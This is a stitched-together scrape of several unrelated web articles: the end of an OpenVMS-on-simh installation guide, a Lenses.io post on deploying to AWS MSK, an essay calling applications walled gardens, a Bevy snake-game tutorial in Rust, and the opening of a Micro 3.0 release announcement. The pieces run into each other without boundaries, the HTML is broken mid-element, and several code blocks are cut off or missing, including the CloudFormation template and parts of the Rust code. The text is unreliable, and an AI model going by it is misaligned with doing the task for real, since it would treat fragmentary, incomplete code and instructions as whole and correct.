  version: 2
  renderer: networkd
  ethernets:
    eth0:
      dhcp4: no
  bridges:
    br0:
      dhcp4: yes
      interfaces:
        - eth0</pre>



<p>After rebooting your Pi, you’ll have an interface named ‘br0’ with a DHCP-assigned IP address, and another interface named ‘eth0’ with no IP address.  Here’s the first issue – I haven’t yet found a way to configure the TAP interface with NetPlan, so each time you reboot, you’ll have to run the TAP interface setup above.</p>



<h2>Booting the emulator</h2>



<p>Now comes the exciting part – run ./vax which will start and take a moment or two to create your RQ0 disk.  At the simh&gt; prompt, enter ‘boot dua3’.  This will boot a minimal OpenVMS image to install the base system.  It will ask for the date and time, so enter it – then it’ll search for and configure devices on your system.</p>



<p>Three devices should appear:</p>



<pre>Available device DUA0: device type RA92<br>Available device DUA1: device type RD54<br>Available device DUA2: device type RD54<br>Available device DUA3: device type RRD40</pre>



<p>DUA0 is your system disk.  DUA1 and DUA2 aren’t connected but are available, and DUA3 is your CD-ROM image.  Enter ‘YES’ when prompted, and you’ll be dropped at a ‘$’ prompt.  Enter the following command:</p>



<pre>BACKUP DUA3:VMS073.B/SAVE_SET DUA0:</pre>



<p>This will copy over a minimal install of OpenVMS in about 3-4 minutes.  To actually boot from this image, press CTRL+E, type ‘boot rq0’ and the emulator will reboot.</p>



<h2>Installing OpenVMS</h2>



<p>After entering the current date and time, you will be prompted to enter a volume label for the system disk.  I use the nodename followed by SYS, but it can be anything from 1-12 characters.</p>



<p>Next, you’ll be asked which components you want to install.  A reasonable set is:</p>



<ul><li>OpenVMS library</li><li>OpenVMS optional</li><li>OpenVMS Help Message</li><li>DECnet Phase IV networking</li></ul>



<p>Before installing DECnet Phase IV, you’ll be asked if you want to continue – just select yes.</p>



<h2>A word on DECnet</h2>



<p>Setting the SCSSYSTEMID parameter needs a bit of background knowledge about DECnet addressing.  In short, DECnet addresses comprise an area (1 to 63) and a node (1 to 1023).  There is a relationship between a DECnet address and a MAC address, and all DECnet hosts have a MAC address starting AA-00-04-00.</p>



<p>The SCSSYSTEMID is calculated by multiplying the DECnet area by 1024, and then adding the node number.  For simplicity, I’ve used addresses 1.1 and 1.2 for my two hosts, which means the SCSSYSTEMIDs will be 1025 and 1026. </p>



<p>After DECnet Phase IV has been configured, you’ll be asked if you want to register any Product Authorization Keys.  Select no – we’ll do that later.</p>



<p>Select your timezone and daylight savings settings, and the installation process will finish up by running AUTOGEN and rebooting.</p>



<h2>Configuring your system</h2>



<p>The first task to do is decompress the OpenVMS libraries.  Disk space isn’t an issue, so we might as well run @SYS$UPDATE:LIBDECOMP.COM and decompress all libraries.  This will take a while!</p>



<p>At this point, we should install the OpenVMS Hobbyist licences we’ve got.  These can either by typed in at the console very slowly, or the script run from a CD-ROM image.  We’re going to go with the latter.</p>



<p>To do this, copy the licence script in to a file called vms_paks.com and put this in a directory with no other files.  The ‘mkisofs’ command will create an ISO image, and we run it as follows:</p>



<pre>mkisofs . &gt; /tmp/licence.iso</pre>



<p>To make this image accessible to our OpenVMS machine, we need to quickly break out of the running operating system and type this at the console:</p>



<pre>attach rq3 -r /tmp/licence.iso</pre>



<p>When you’re back in OpenVMS, mount the image using the following command:</p>



<pre>MOUNT/OVERRIDE=IDENTIFICATION DUA3</pre>



<p>You can shorten OVERRIDE=IDENTIFICATION down to OVER=ID.  This parameter tells OpenVMS to mount the image as-is, without trying to mount it according to the volume name.</p>



<p>We could run the script straight from our CD-ROM image by running @DUA3:[000000]VMS_PAKS.COM, but this won’t work – the line endings are wrong.  To work around this, copy the file to your home directory and set some attributes on it:</p>



<pre>COPY DUA3:[000000]VMS_PAKS.COM SYS$LOGIN
SET FILE/ATTRIBUTE=(RFM=STM) VMS_PAKS.COM</pre>



<p>When you run @VMS_PAKS.COM, it’ll happily install all the licences.  You can see what’s installed by running SHOW LICENSE:</p>



<h2>Installing TCP/IP</h2>



<p>Almost all conventional operating systems have an IP stack available by default.  OpenVMS doesn’t, so it needs to be installed.</p>



<p>Before we install TCP/IP, we’ll need to increase the global pages value – by default, it’s 15000 and we need it to be higher.</p>



<pre>EDIT/TPU SYS$SYSTEM:MODPARAMS.DAT</pre>



<p>Add the following lines:</p>



<pre>MIN_GBLPAGES=30000
ADD_INTSTKPAGES=12</pre>



<p>Next, run AUTOGEN:</p>



<pre>@SYS$UPDATE:AUTOGEN GETDATA SETPARAMS FEEDBACK</pre>



<p>The installation is in the director TCPIP_VAX051 on the OpenVMS CD-ROM.  We can mount it and install with the following commands:</p>



<pre>MOUNT/OVER=ID DUA3:
SET DEFAULT DUA3:[TCPIP_VAX051.KIT]
PRODUCT INSTALL *</pre>



<p>There isn’t much to configure with the initial installation, so we can start to configure:</p>



<pre>@SYS$MANAGER:TCPIP$CONFIG.COM</pre>



<p>Select option 1 – Core Environment, and option 2 – Interfaces.  Select option 2 to use DHCP, and option 1 to enable DHCP_CLIENT.</p>



<h2>That’s all folks</h2>



<p>Wow, what a lot of work.  Operating systems from decades past were installed and configured, then often never shut down for months or years.  How times have changed.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Running your own Kafka is starting to feel like wading through oatmeal.</p><p>We’re not the only ones thinking that.&nbsp; The majority of organizations we speak to have or are in the process of moving their Kafka to a managed service.&nbsp;&nbsp;</p><p>If you’re already an AWS-shop, <a href="https://lenses.io/blog/2020/11/how-to-deploy-dataops-for-aws-msk-for-kafka/lenses.io/cloud/aws-msk/">Managed Streaming for Apache Kafka (MSK)</a><b> </b>is a no-brainer. It is the same Kafka that we know and love and integrated with other AWS services such as IAM, Cloudwatch, Cloudtrail, KMS, VPC and more. And of course you can run your data apps on EKS.&nbsp;</p><p>A managed Kafka takes the heavy lifting away from your infrastructure operations, but that's only half the battle. At Lenses.io we've built the tools you need for data discovery, governance, self-service to take more load away from your data operations (DataOps).&nbsp;Including the support for AWS <a href="https://lenses.io/blog/2019/12/lenses-and-aws-msk-collapsing-delivery-timeframes-open-monitoring/">Open Monitoring</a>.</p><h2>A two-click AWS MSK provision
</h2><p>In a matter of two clicks in the AWS console, you can have your fully managed Kafka MSK cluster provisioned. 
</p><p>So AWS set the bar high for us to deploy <b>Lenses DataOps for MSK</b> just as seamlessly.</p><p>Traditionally, there have been two ways of deploying Lenses for MSK. Manual install via Docker/Helm/Tarball or via the AWS Marketplace which triggers a CloudFormation template.</p><p>In a bid to deliver a quicker and better experience, we’ve delivered a <a href="https://portal.lenses.io/register?version=msk">Cloud Portal</a> to deploy instances of Lenses (“workspaces”) across different clouds. And we’re prioritising AWS and MSK as our first cloud. 
</p><p>The Portal deals with all the management of deploying Lenses on an EC2 instance and connecting it to your MSK Cluster, Schema Registry and Kafka Connect Cluster (should you have them). It’s also taken out the need of requesting a license key.</p><p><img src="https://images.ctfassets.net/tnuaj0t7r912/3Xwq0vUjpFUQwj6hqm3p8U/337d9df2d1ea5c844c5eab8599930029/MSKBlog_01.png" alt="Lenses to AWS MSK"></p><h2>Here’s how you deploy Lenses DataOps for MSK in 5 steps</h2><h3>1. Create a portal.lenses.io account</h3><p>With a single Lenses.io Cloud Portal user account, you can deploy instances of Lenses and operate them centrally. In the current release, two deployment types are supported: a demo environment with pre-configured Kafka and datagens, or a Lenses workspace for MSK.&nbsp;</p><h3>2. Create an IAM role</h3><p>For Lenses to be able to automate the deployment of Lenses in your VPC (Amazon Virtual Private Cloud), it must have credentials to access certain of your AWS resources on your behalf.&nbsp;</p><p>This is a common practice amongst AWS partners. The recommended option from AWS involves you creating an IAM role granting us (a third party) access to your AWS resources. This role will be used to generate temporary credentials to access certain resources.&nbsp;</p><p>The role can be created via a Cloudformation template that has already been prepared:</p><pre>AWSTemplateFormatVersion:&nbsp;2010-09-09

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
        
    
    
      
    
    
    
<p>We often hear that Apple's ecosystem of apps (or Microsoft's, or Google's) are "walled gardens". But what about the individual applications themselves?</p>
<p>In fact, individual programs are even more harmful walled gardens - a stifling barrier to true expressiveness, productivity, freedom and consistency of computing experience.</p>
<h2>Imagining software beyond apps or webpages or programs</h2>
<p>Think about adding up some numbers in a tabular structure. That's straightforward with most programming languages. But what if that same table is in a web page, or a mobile app, or a PDF? It's right there on the screen, it's probably encoded as a table in the markup. So the data is there. And yet, we can't query it.</p>
<p>Maybe if we copy-and-paste it we can query it. Or maybe we can download the page, save it to disk, write code to load the page, parse the table, and dump the data into a database.</p>
<p>But why should we need to do any of those things? Why can't we just query it directly?</p>
<p>There's a wall around each app preventing this sort of thing. A <em>program</em> is in the way, blocking our path to expressiveness and computing freedom. Much like great nations, great software should build bridges, not walls.</p>
<p>What would software look like, beyond standalone applications? What would software look like without walls?</p>
<h2>A new kind of object-orientation</h2>
<p>Notions of object-oriented programming are long-established and familiar. In the OO heyday there were high hopes that OO would allow much higher levels of expressiveness and encapsulation, and along with it, greater reuse and recombination of code.</p>
<p>This absolutely hasn't eventuated - once again, applications are the problem. Photoshop's codebase and Instagram's codebase no doubt have sophisticated <code>Image</code> objects defined, but each only exists within its gated prison.</p>
<p>A truly expressive system would let us seamlessly apply any filter to any image, but this isn't currently possible.</p>
<p>Each has an entirely separate notion of what <code>Image</code> means and can do - each app essentially rebuilds an object's meaning from the ground up. If we're interested in inter-operability, re-use, and consistency, this is a terrible situation.</p>
<p>We need computing environments where the building blocks are inherently interoperable <em>objects</em> - to interact with directly, without the concept of applications appearing at all.</p>
<p>Currently the most compelling software is that which locks the most functionality within it - in an environment of objects, the most compelling software would be that which exposes the most inter-operable re-combinable functionality to the objects around it.</p>
<p>This is in no way a new or original idea - Alan Kay and friends in the Smalltalk scene have been playing around with such concepts for decades with things like <a href="https://en.wikipedia.org/wiki/Squeak">Squeak</a>. And similar ideas have been used quite effectively in business system implementations with <a href="https://en.wikipedia.org/wiki/Naked_objects">naked objects</a>, the notion that a user interface should be directly generated from the objects it represents.</p>
<p>Perhaps the most well-known effort to build richer, consistent meaning into the software experience is the <a href="https://en.wikipedia.org/wiki/Semantic_Web">semantic web</a>, however its adoption has been limited.</p>
<p>Whatever the success of these systems, it hasn't led to more general purpose systems being developed around these concepts.</p>
<p>Why not? What are the obstacles and how can we overcome them?</p>
<h2>Conway's law</h2>
<p>Conway's law has been getting a lot of airing recently - and for good reason. It has a lot of explanatory power for the contemporary state of software.</p>
<p>Conway's law postulates that the structure of software reflects the social structure the software exists within - readily observed in typical corporate websites where the structure mirrors that of the corporate hierarchy rather than around the needs of the users.</p>
<p>But it is at the application and operating system level that Conway's law is most engrained, and most pathological.</p>
<p>The components of the operating system - the core OS itself, its applications, and its websites - are a manifestation of the economic entities that create them.</p>
<p>The boundaries have to be drawn somewhere - Mozilla creates a browser but can't create all the websites you need. Microsoft wants to let you use Windows for 3d modelling but doesn't create that software itself. Same story with the iPhone - even an enormous corporation like Apple needs external app developers to enable the iPhone's range of capabilities.</p>
<p>The solution is sandboxing - processes and containers, browser tabs, phone apps. The code we need for day-to-day computing sits within these sandboxes, and in doing so, imprisons that code, preventing the expressive power and consistency we've mentioned.</p>
<p>Often these apps will have features to integrate with other apps and the wider operating system - but not so much that they become invisible. Instagram still wants you to see its logo, consume its specific content and stay within its ecosystem. Once again, the implementation and architecture are driven by economic imperatives.</p>
<p>We'd like all our conversations to be in one place - but the imperatives have them split between several different protocols (often proprietary) and tens of different software clients.</p>
<p>The hardest technical problems to solve are political problems.</p>
<h2>Principles for empowered computing</h2>
<p>Better systems must be built along the following principles (for starters):</p>
<ul>
<li>
<p><strong>Widely reusable meaning:</strong> Right now our shared "primitives" are very primitive indeed: basics like bytes and sockets. We must build much higher level shared meaning - <code>Images</code>, <code>Tables</code>, <code>Conversations</code> and beyond, building a common implementation and understanding used by everybody. This must not be limited to an optional sprinkling of additional meaning a la the semantic web - shared meaning and interoperability must be baked into the OS as fundamental.</p>
</li>
<li>
<p><strong>Data without borders:</strong> The "things" of computing should be able to talk directly without anything in the way. For instance, any two tables of data available to the user through the OS should be joinable or otherwise combinable as easily as if they were in the same database.</p>
</li>
<li>
<p><strong>Inherent, ubiquitous programmability:</strong> Currently, "doing programming" is a segregated activity from mainstream computing - separate software, command lines, specialist knowledge, clunky text-driven interfaces. This must end. Real expressiveness demands that every entity in the interface is inherently programmable - a table of data shouldn't just be a rendered picture of a table of data - it should <em>be a table</em>. Programming shouldn't be <em>separate</em> at all.</p>
</li>
</ul>
<h2>Building something different</h2>
<p>There's no doubt these concepts are very broad and open-ended. Beyond the political problem of challenging status quo computing and pushing for an alternative, there are complex design and technical challenges in the specifics.</p>
<p>How do you build ubiquitous programmability into interfaces without adding clutter or reducing usability? How do you remove barriers between programs and more tightly integrate data without compromising security?</p>
<p>Conway's law tells us that to build something different, we need to build upon different social and political structures.</p>
<h2>Open-ended research</h2>
<p>Short-term commercial realities mean packaging things up in sellable units - escaping the application prison requires the opposite approach. Developing a fresh approach is going to require isolation from the short-term imperatives of the market.</p>
<p>Academia used to offer this. But the relentless march of neoliberalism has seen the open-ended possibilities of research constrained by "business logic", funding processes that demand narrow parameters of investigation, and a creativity-crushing increase in busywork. <a href="https://www.theguardian.com/science/2013/dec/06/peter-higgs-boson-academic-system">Peter Higgs of Higgs boson fame famously commented that he wouldn't be productive enough in today's academic environment</a>.</p>
<p><a href="https://en.wikipedia.org/wiki/The_Entrepreneurial_State">The other bastion of open-ended research was government</a> - the internet itself came from US military research. Here too funding for long term open-ended research has dried up, and even the military money has been more tightly constrained to projects with more obvious, shorter term military application - our amoral powerful would rather spend a trillion building new fighter jet systems than new software systems.</p>
<p>Rare-but-notable efforts like <a href="https://en.wikipedia.org/wiki/PARC_(company)">Xerox PARC</a> suffered similar fates, able to fend off the bean-counters for a while but not indefinitely.</p>
<h2>Rebooting</h2>
<p>The realization that the software experience is still built on artifacts of computing from the 80s like text-based command lines is a lot less surprising considered within the context of this ongoing decline.</p>
<p>Climate change has shown us that mere awareness of the situation we are in isn't enough. Actual liberation from disaster requires a bold change of direction and a acknowledgement of shared, public goals beyond the financial.</p>
<p>Liberation from the constraints of today's limiting computing concepts will require similar boldness - large scale open-ended research, long term timeframes, but most fundamentally, a willingness to change path.</p>

            <p><a href="https://bevyengine.org/">Bevy</a> has seen rapid adoption recently, but the
learning resources are still fairly scarce. This is an attempt to provide a next
step after the Bevy book.  The final product looks like this:</p>

<p>It’s about 300 lines of Rust, so buckle in; this is a lengthy walkthrough. If
you want to fast-forward to the finished code, the code lives
<a href="https://github.com/marcusbuffett/bevy_snake/tree/tutorial">here</a>. For each
section there’s a diff at the top, which should make it easier to determine
where to place snippets of code, when it’s not clear.</p>

<p>We’ll start how the bevy book starts, with an app that does nothing. Run <code>cargo new bevy-snake</code>, then put the following in your <code>main.rs</code>:</p>
<div><pre><code data-lang="rust"><span>use</span> bevy::prelude::<span>*</span>;

<span>fn</span> <span>main</span>() {
    App::build().run();
}
</code></pre></div><p>We’ll need to add bevy as a dependency in our <code>Cargo.toml</code>, and because I have
the ability to predict the future of this tutorial, let’s go ahead and add
<code>rand</code> in there too so we have it when the time comes.</p>
<div><pre><code data-lang="toml"><span>//</span> ...

[<span>dependencies</span>]
<span>bevy</span> = <span>"0.3.0"</span>
<span>rand</span> = <span>"0.7.3"</span>

    </p></div>
</div>
<p>We’re going to be creating a 2D game, which requires a lot of different systems;
one to create a window, one to do a render loop, one to handle input, one to
handle sprites, etc. Luckily Bevy’s default plugins give us all of that:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>main</span>() {
    App::build().add_plugins(DefaultPlugins).run();
}
</code></pre></div><p>Bevy’s default plugins don’t include a camera though, so let’s insert a 2d
camera, which we’ll set up by creating our first system:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>setup</span>(<span>mut</span> commands: <span>Commands</span>) {
    commands.spawn(Camera2dComponents::default());
}
</code></pre></div><p><a href="https://docs.rs/bevy_ecs/0.2.1/bevy_ecs/struct.Commands.html"><code>Commands</code></a> is
used to queue up commands to mutate the world and resources. In this case, we’re
spawning a new entity, with 2D camera components. Prepare for some bevy magic:</p>
<div><pre><code data-lang="rust">App::build()
    .add_startup_system(setup.system()) <span>// &lt;--
</span><span></span>    .add_plugins(DefaultPlugins)
    .run();
</code></pre></div><p>All we have to do is call <code>.system()</code> on our function, and Bevy will
auto-magically call it at startup with the <code>commands</code> param. Run the app again,
and you should get an empty window like this:</p>
<p><img src="https://mbuffett.com/bevy_snake/new_pics/empty_window.png"></p><h2 id="the-beginnings-of-a-snake">The beginnings of a snake</h2>

    <div>
        <p><a href="https://github.com/marcusbuffett/bevy_snake/commit/baaefcc">See the diff</a> for this section
    </p></div>
</div>
<p>Let’s try to get a snake head in there. We’ll define a couple structs:</p>
<div><pre><code data-lang="rust"><span>struct</span> <span>SnakeHead</span>;
<span>struct</span> <span>Materials</span> {
    head_material: <span>Handle</span><span>&lt;</span>ColorMaterial<span>&gt;</span>,
}
</code></pre></div><p><code>SnakeHead</code> is just an empty struct that we’ll use as a component, it’s sort of
like a tag, we’ll put on an entity, and then we can find that entity later by
querying for entities with the <code>SnakeHead</code> component. Empty structs like these
are a common pattern in Bevy, components often don’t need any state of their
own. <code>Materials</code> is going to be a resource, which stores the material that
we’ll use for the snake head for now, and eventually for the snake segments and
the food.</p>
<p>That <code>head_material</code> handle should be created when the game gets set up, so let’s
do that next, by modifying our <code>setup</code> function:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>setup</span>(<span>mut</span> commands: <span>Commands</span>, <span>mut</span> materials: <span>ResMut</span><span>&lt;</span>Assets<span>&lt;</span>ColorMaterial<span>&gt;&gt;</span>) {
    commands.spawn(Camera2dComponents::default());
    commands.insert_resource(Materials {
        head_material: <span>materials</span>.add(Color::rgb(<span>0.7</span>, <span>0.7</span>, <span>0.7</span>).into()),
    });
}
</code></pre></div><div>
    <p><img src="https://mbuffett.com/warning_icon.svg">
    </p>
    
    <p>Bevy requires a specific ordering to the params when registering
systems. Commands → Resources → Components/Queries. If you get a mysterious
compile-time error after messing with a system, check your order. </p>
</div>
<p><code>materials.add</code> will return a <code>Handle&lt;ColorMaterial&gt;</code>. We create a
<code>Materials</code> struct using this new handle. Later, when we try to access a
resource with the type of <code>Materials</code>, Bevy will find this struct we’ve
created. We’ll now create our snake head entity in a new system, and you can see
what using that resource looks like:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>game_setup</span>(<span>mut</span> commands: <span>Commands</span>, materials: <span>Res</span><span>&lt;</span>Materials<span>&gt;</span>) {
    commands
        .spawn(SpriteComponents {
            material: <span>materials</span>.head_material.clone(),
            sprite: <span>Sprite</span>::new(Vec2::new(<span>10.0</span>, <span>10.0</span>)),
            ..Default::default()
        })
        .with(SnakeHead);
}
</code></pre></div><p>Here we’ve got a new system, which will look for a resource of type
<code>Materials</code>. It will then spawn a new entity, with <code>SpriteComponents</code> and
<code>SnakeHead</code> as components. To create the <code>SpriteComponents</code>, we pass in the
handle to the color material we created earlier, and give the sprite a size
of (10,10). Let’s just add that system into our app builder:</p>
<div><pre><code data-lang="rust">.add_startup_system(setup.system())
.add_startup_stage(<span>"game_setup"</span>) <span>// &lt;--
</span><span></span>.add_startup_system_to_stage(<span>"game_setup"</span>, game_setup.system()) <span>// &lt;--
</span></code></pre></div><p>The reason we need a new stage instead of just calling <code>add_startup_system</code>
again, is that we need to use the material that gets inserted in the <code>setup</code>
function. After running this, you should see a snake head in the middle of the
screen:</p>
<p><img src="https://mbuffett.com/bevy_snake/new_pics/snake_pixel.png"></p><p>Okay maybe calling it a snake head is a stretch, you’ll see a 10x10 white sprite.</p>
<h2 id="moving-the-snake">Moving the snake</h2>
<div>
    <p><img src="https://mbuffett.com/diff_icon.svg">

    <div>
        <p><a href="https://github.com/marcusbuffett/bevy_snake/commit/fde99c9">See the diff</a> for this section
    </p></div>
</div>
<p>Snake isn’t much of a game without movement, so let’s get that head moving.
We’ll worry about input later, for now our goal is just to get the head to
move. So let’s create a system that will move all snake heads up:</p>

</code></pre></div><p>The main new concept here is that <code>Query</code> type. We can use it to iterate through
all entities that have both the <code>SnakeHead</code> component and the <code>Transform</code>
component. We don’t have to worry about actually creating that query, bevy will
take care of creating it and calling our function with it, part of the ECS
magic. So let’s add that system in and see what happens:</p>
<div><pre><code data-lang="rust">.add_startup_system_to_stage(<span>"game_setup"</span>, game_setup.system())
.add_system(snake_movement.system()) <span>// &lt;--
</span><span></span>.add_plugins(DefaultPlugins)
</code></pre></div><p>Here’s what we get, a snake head moving off-screen:</p>

</video>
<p>You may be wondering about that Transform component. When we spawned the
<code>SnakeHead</code>, we didn’t give it a <code>Transform</code>, so how come we’re able to find an
entity that has a <code>SnakeHead</code> and a <code>Transform</code> component? What’s going on there
is that <code>SpriteComponents</code> is a
<a href="https://docs.rs/bevy/0.1.2/bevy/prelude/trait.Bundle.html"><code>Bundle</code></a> of
components. For <code>SpriteComponents</code>, that means we get a <code>Transform</code> component,
among a bunch of others (<code>Sprite</code>, <code>Mesh</code>, <code>Draw</code>, <code>Rotation</code>, <code>Scale</code>, etc).</p>

</div>
<p>Let’s modify our snake movement system to actually allow us to direct the snake:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>snake_movement</span>(
    keyboard_input: <span>Res</span><span>&lt;</span>Input<span>&lt;</span>KeyCode<span>&gt;&gt;</span>,
    <span>mut</span> head_positions: <span>Query</span><span>&lt;</span>(<span>&amp;</span>SnakeHead, <span>&amp;</span><span>mut</span> Transform)<span>&gt;</span>,
) {
    <span>for</span> (_head, <span>mut</span> transform) <span>in</span> head_positions.iter_mut() {
        <span>if</span> keyboard_input.pressed(KeyCode::Left) {
            <span>*</span>transform.translation.x_mut() <span>-=</span> <span>2.</span>;
        }
        <span>if</span> keyboard_input.pressed(KeyCode::Right) {
            <span>*</span>transform.translation.x_mut() <span>+=</span> <span>2.</span>;
        }
        <span>if</span> keyboard_input.pressed(KeyCode::Down) {
            <span>*</span>transform.translation.y_mut() <span>-=</span> <span>2.</span>;
        }
        <span>if</span> keyboard_input.pressed(KeyCode::Up) {
            <span>*</span>transform.translation.y_mut() <span>+=</span> <span>2.</span>;
        }
    }
}
</code></pre></div><p>Now we can control the snake, albeit in very un-snake-like fashion:</p>

    <div>

    </p></div>
</div>
<p>So far we’ve been using window coordinates, and the way that works is that (0,0)
is the middle, and the units are pixels. Snake games generally use grids, so if
we made our snake game 10x10, our window would be <em>really</em> small. Let’s make our
lives a bit easier by using our own positioning and sizing. Then we can use
systems that deal with transforming these to window coordinates.</p>
<p>We’ll make our grid 10x10. We’ll define those as constants up at the top of the
file:</p>
<div><pre><code data-lang="rust"><span>const</span> ARENA_WIDTH: <span>u32</span> <span>=</span> <span>10</span>;
<span>const</span> ARENA_HEIGHT: <span>u32</span> <span>=</span> <span>10</span>;
</code></pre></div><p>Here are our new structs for positioning/sizing:</p>
<div><pre><code data-lang="rust"><span>#[derive(Default, Copy, Clone, Eq, PartialEq, Hash)]</span>
<span>struct</span> <span>Position</span> {
    x: <span>i32</span>,
    y: <span>i32</span>,
}

<span>struct</span> <span>Size</span> {
    width: <span>f32</span>,
    height: <span>f32</span>,
}
<span>impl</span> Size {
    <span>pub</span> <span>fn</span> <span>square</span>(x: <span>f32</span>) -&gt; <span>Self</span> {
        Self {
            width: <span>x</span>,
            height: <span>x</span>,
        }
    }
}
</code></pre></div><p>Fairly straightforward, with a helper method to get a <code>Size</code> with equal width
and height. Position derives some traits that will be useful later, so we don’t
have to keep going back to it. <code>Size</code> could really just have one float, since
all objects will end up having equal width and height, but it feels wrong so I’m
giving it a width and a height. Let’s add those components to the snake head we
spawn:</p>
<div><pre><code data-lang="rust">commands
    .spawn(SpriteComponents {
        material: <span>materials</span>.head_material.clone(),
        sprite: <span>Sprite</span>::new(Vec2::new(<span>10.0</span>, <span>10.0</span>)),
        ..Default::default()
    })
    .with(SnakeHead)
    .with(Position { x: <span>3</span>, y: <span>3</span> }) <span>// &lt;--
</span><span></span>    .with(Size::square(<span>0.8</span>)); <span>// &lt;--
</span></code></pre></div><p>These components aren’t doing anything currently, let’s start with transforming
our sizes into sprite sizes:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>size_scaling</span>(windows: <span>Res</span><span>&lt;</span>Windows<span>&gt;</span>, <span>mut</span> q: <span>Query</span><span>&lt;</span>(<span>&amp;</span>Size, <span>&amp;</span><span>mut</span> Sprite)<span>&gt;</span>) {
    <span>for</span> (size, <span>mut</span> sprite) <span>in</span> q.iter_mut() {
        <span>let</span> window <span>=</span> windows.get_primary().unwrap();
        sprite.size <span>=</span> Vec2::new(
            size.width <span>as</span> <span>f32</span> <span>/</span> ARENA_WIDTH <span>as</span> <span>f32</span> <span>*</span> window.width() <span>as</span> <span>f32</span>,
            size.height <span>as</span> <span>f32</span> <span>/</span> ARENA_HEIGHT <span>as</span> <span>f32</span> <span>*</span> window.height() <span>as</span> <span>f32</span>,
        );
    }
}
</code></pre></div><p>The sizing logic goes like so: if something has a width of 1 in a grid of 40,
and the window is 400px across, then it should have a width of 10. Next we can
do the positioning system:</p>
<div><pre><code data-lang="rust"><span>fn</span> <span>position_translation</span>(windows: <span>Res</span><span>&lt;</span>Windows<span>&gt;</span>, <span>mut</span> q: <span>Query</span><span>&lt;</span>(<span>&amp;</span>Position, <span>&amp;</span><span>mut</span> Transform)<span>&gt;</span>) {
    <span>fn</span> <span>convert</span>(p: <span>f32</span>, bound_window: <span>f32</span>, bound_game: <span>f32</span>) -&gt; <span>f32</span> {
        p <span>/</span> bound_game <span>*</span> bound_window <span>-</span> (bound_window <span>/</span> <span>2.</span>) <span>+</span> (bound_window <span>/</span> bound_game <span>/</span> <span>2.</span>)
    }
    <span>let</span> window <span>=</span> windows.get_primary().unwrap();
    <span>for</span> (pos, <span>mut</span> transform) <span>in</span> q.iter_mut() {
        transform.translation <span>=</span> Vec3::new(
            convert(pos.x <span>as</span> <span>f32</span>, window.width() <span>as</span> <span>f32</span>, ARENA_WIDTH <span>as</span> <span>f32</span>),
            …</code></pre></div></div></div>

      <p>This is the official announcement for the release of Micro 3.0 better known as M3O - a platform for cloud native development. 
Our 3.0 release is a major refactor and consolidation of the existing tooling into something that addresses the entire workflow 
of build, run, manage and consume all from the developers perspective.</p>

<p>Read on to learn more or go straight to the <a href="https://github.com/micro/micro/releases/latest">latest release</a>. 
Head to <a href="https://m3o.com/">m3o.com</a> for the hosted offering.</p>

<h2 id="overview">Overview</h2>

<p>Micro focuses on developer productivity for the backend. It’s clear that the Cloud has become infinitely more complex 
over the past few years. Micro attempts to create order out of that chaos by distilling it all down to a handful of 
primitives for distributed systems development.</p>

<p>Why should you care? If you’re reading this you’ve no doubt encountered the tedious nature of infrastructure management, 
wrangling a kubernetes cluster on AWS or the thousands of things you need to do to cobble together a platform before 
starting to build a product. We think we’ve nailed the solution for that just as Android did for Mobile. Keep reading 
if you want to find out more.</p>

<h2 id="quick-flashback">Quick Flashback</h2>

<p>Micro started out as a <a href="https://micro.mu/blog/2016/03/20/micro.html">toolkit for microservices</a> development, 
incorporating an api gateway, web dashboard and cli to interact with services built using a Go RPC framework. 
Back then it felt like getting anyone to buy into PaaS again was going to be a losing battle. So we chose 
to write single purpose tools around an RPC framework thinking it might allow people to adopt it piece by piece 
until they saw the need for a platform. It was really straight forward right until it wasn’t.</p>

<p>There was a simple Go framework plus some surrounding 
components to query and interact with them, but like any long lived project, the complexity grew as we 
tried to solve for that platform experience that just couldn’t be done with a swiss army knife. The repo 
exploded with a number of independent libraries. To the creator its obvious what these are all for but to 
the user there is nothing but cognitive overload.</p>

<p>In 2019 we went through a <a href="https://micro.mu/blog/2019/06/10/the-great-consolidation.html">consolidation</a> of all those libraries 
which helped tremendously but there was still always one outstanding question. What’s the difference between 
<a href="https://github.com/micro/micro">micro</a> and <a href="https://github.com/micro/go-micro">go-micro</a>? It’s a good 
question and one we’ve covered before. We saw go-micro as a framework and micro as a toolkit but these 
words were basically empty and meaningless because multiple projects working in coordination really need a 
crisp story that makes sense and we didn’t have one.</p>

<p>In 2020 we’re looking to rectify that but let’s first let’s talk about platforms.</p>

<h2 id="paas-in-2020">PaaS in 2020</h2>

<p>5 years ago the world exploded with a proliferation of “cloud native” tooling as containers and 
container orchestration took centre stage. More specifically, Docker and Kubernetes redefined the 
technology landscape along with a more conscious move towards building software in the cloud.</p>

<p>Micro took a forward looking view even as far back as 2015. It was clear distributed systems and cloud native 
was going to become the dominant model for backend services development over the coming years but, what wasn’t clear 
is just how long we’d spend wrangling all sorts tools like docker, kubernetes, grpc, istio and everything else. 
It felt like we were rebuilding the stack and weren’t really ready to talk about development aspects of it all.</p>

<p>In fact at that time, people mostly wanted to kick the tyres on all these tools and piece something together. 
Running kubernetes yourself became all the rage and even using service mesh as the holy grail for solving 
all your distributed systems problems. Many of us have come to realise while all of this tech is fun 
it’s not actually solving development problems.</p>

<p>We’ve gotten to the point of managed kubernetes and even things like Google Cloud Run or DigitalOcean App 
Platform, but none of these things are helping with a development model for a cloud native era. Our 
frustrations with the existing developer experience have grown and Micro felt like something that 
could solve for all that, but only if we took a drastic step to overhaul it.</p>

<p>We think PaaS 3.0 is not just about running your container or even your source code but something that 
encapsulates the entire developer experience including a model for writing code for the cloud. Based on that 
Micro 3.0 aka M3O is a platform for cloud native development.</p>

<h2 id="what-even-is-cloud-native">What even is Cloud Native?</h2>

<p>What is cloud native? What does it mean to build for the cloud? What is a cloud service?</p>

<p>Cloud native is basically a descriptive term for something that was built to run in the cloud. That’s it. It’s not 
magic, it might sound like a buzzword, but the reality is it simply means, that piece of software was built 
to run in the cloud. How does that differ from the way we used to build before? Well the idea behind the cloud 
is that its ephemeral, scalable and everything can be accessed via an API.</p>

<p>Our expectation for services running in the cloud is that they’re mostly stateless, leveraging external services 
